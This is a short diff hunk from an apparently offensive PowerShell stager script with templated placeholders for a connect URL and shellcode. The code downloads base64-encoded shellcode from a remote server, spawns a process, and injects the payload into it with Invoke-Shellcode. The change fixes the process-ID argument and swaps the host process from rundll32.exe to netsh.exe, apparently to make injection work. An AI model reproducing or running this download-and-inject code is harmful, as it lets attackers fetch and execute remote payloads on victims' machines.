@@ -489,6 +489,6 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 
 $b64 = (New-Object System.Net.WebClient).DownloadString('#REPLACECONNECTURL#/#REPLACEQUICKCOMMAND##REPLACEB64SHELLCODE#');
 $sc = [System.Convert]::frombase64string($b64);
-$pid = (start-process -filepath "rundll32.exe" -passthru).Id
-Invoke-Shellcode -Shellcode $sc -Force -ProcessId
+$processid = (start-process -filepath "netsh.exe" -passthru).Id
+Invoke-Shellcode -Shellcode $sc -Force -ProcessId $processid
 
